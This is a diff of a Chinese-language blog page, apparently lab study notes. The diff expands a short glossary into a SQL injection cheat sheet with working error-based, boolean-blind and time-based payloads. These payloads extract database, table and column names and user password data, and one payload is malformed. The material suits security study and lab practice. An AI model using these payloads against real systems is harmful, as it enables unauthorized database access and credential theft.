@@ -85,7 +85,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">182</span>
+            <span class="post-count">550</span>
         </span>
     </span>
 
@@ -94,36 +94,48 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">1 min</span>
+            <span class="post-count">2 min</span>
         </span>
     </span>
 </div>
  
     </div>
       
+    <div class="tocbot"></div>
+
 
 
 
   
     <div class="article-entry" itemprop="articleBody">
        
-  <p>布尔盲注</p>
-<blockquote>
-<p>盲注和普通注入不同，普通注入查询正确会有返回值，而盲注只判断对错</p>
-</blockquote>
-<p>时间盲注</p>
-<blockquote>
-<p>添加条件语句判断是否执行了延迟</p>
-</blockquote>
-<p>报错盲注</p>
-<blockquote>
-<p>构造报错payload让信息通过报错信息回显出来，在查询不回显信息时，会答应错误信息</p>
-</blockquote>
-<p>盲注常用函数</p>
-<blockquote>
+  <h3 id="盲注-页面没有回显位"><a href="#盲注-页面没有回显位" class="headerlink" title="盲注(页面没有回显位)"></a>盲注(页面没有回显位)</h3><p>优先考虑报错注入，看有无报错回显，其次看是否能进行布尔盲注，最后再考虑时间盲注</p>
+<h4 id="报错注入-页面上没有显示位，但是必须有SQL语句执行错误的信息"><a href="#报错注入-页面上没有显示位，但是必须有SQL语句执行错误的信息" class="headerlink" title="报错注入(页面上没有显示位，但是必须有SQL语句执行错误的信息)"></a>报错注入(页面上没有显示位，但是必须有SQL语句执行错误的信息)</h4><h5 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and extractvalue(1,concat(1,(select database())))#</span><br><span class="line"></span><br><span class="line">admin&#x27; and updatexml(1,concat(&#x27;~&#x27;,(select database())),1) #</span><br></pre></td></tr></table></figure>
+
+<h5 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and extractvalue(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)))#</span><br><span class="line"></span><br><span class="line">admin&#x27; and updatexml(1,concat(0x7e,(select group_concat( table_name) from information_schema.tables where table_schema=&#x27;security&#x27; )),1)#</span><br></pre></td></tr></table></figure>
+
+<h5 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and extractvalue(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;)))#</span><br><span class="line"></span><br><span class="line">admin&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 0,1),0x7e),1) #</span><br></pre></td></tr></table></figure>
+
+<h5 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and extractvalue(1,concat(1,(select group_concat(username,password) from security.users limit 0,1)))#</span><br><span class="line"></span><br><span class="line">admin&#x27; and updatexml(1,concat(0x7e,(select group_concat(username,password) from security.users)),1)#</span><br></pre></td></tr></table></figure>
+
+<h4 id="布尔盲注-只能判断页面返回是否正常"><a href="#布尔盲注-只能判断页面返回是否正常" class="headerlink" title="布尔盲注(只能判断页面返回是否正常)"></a>布尔盲注(只能判断页面返回是否正常)</h4><h5 id="判断数据库名称的长度"><a href="#判断数据库名称的长度" class="headerlink" title="判断数据库名称的长度"></a>判断数据库名称的长度</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length(database()) = 4#</span><br></pre></td></tr></table></figure>
+
+<h5 id="猜数据库名称第一个字符"><a href="#猜数据库名称第一个字符" class="headerlink" title="猜数据库名称第一个字符"></a>猜数据库名称第一个字符</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr(database(),1,1)) =100#</span><br><span class="line">1&#x27; and if(length(database())=8,1,0)#</span><br></pre></td></tr></table></figure>
+
+<p>之后的爆库爆表爆字段就把database()替换套进去就行了，判断长度用length()，判断字符用substr()，left()，判断数量用count<br>如爆库的数量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database()) = 2 #</span><br></pre></td></tr></table></figure>
+
+<p>如爆表的第2个字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=117 # </span><br><span class="line"></span><br><span class="line">1&#x27; and if(left(select table_name from information_schema.tables where table_schema=database())=s&#x27;a&#x27;,1,0)#  </span><br></pre></td></tr></table></figure>
+
+<h4 id="时间盲注-页面返回无变化"><a href="#时间盲注-页面返回无变化" class="headerlink" title="时间盲注(页面返回无变化)"></a>时间盲注(页面返回无变化)</h4><h5 id="判断闭合"><a href="#判断闭合" class="headerlink" title="判断闭合"></a>判断闭合</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and sleep(5)#   //浏览器睡眠了五秒说明为单引号闭合</span><br></pre></td></tr></table></figure>
+
+<p>常用于if语句，使用方法和布尔盲注一样</p>
+<h5 id="如爆库长度"><a href="#如爆库长度" class="headerlink" title="如爆库长度"></a>如爆库长度</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(length(database())&gt;10,1,sleep(5))   //错误则浏览器沉睡5秒，正确则快速返回</span><br></pre></td></tr></table></figure>
+
+<h5 id="盲注常用函数"><a href="#盲注常用函数" class="headerlink" title="盲注常用函数"></a>盲注常用函数</h5><blockquote>
 <p>Length（）函数 返回字符串的长度<br>Substr（）截取字符串<br>Ascii（）返回字符的ascii码<br>sleep(n)：将程序挂起一段时间 n为n秒<br>if(expr1,expr2,expr3):判断语句如果第一个语句正确就执行第二个语句，如果错误执行第三个语句</p>
 </blockquote>
-<p>参考文章:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/vincy99/p/9642956.html">https://www.cnblogs.com/vincy99/p/9642956.html</a></p>
  
       <!-- reward -->
       
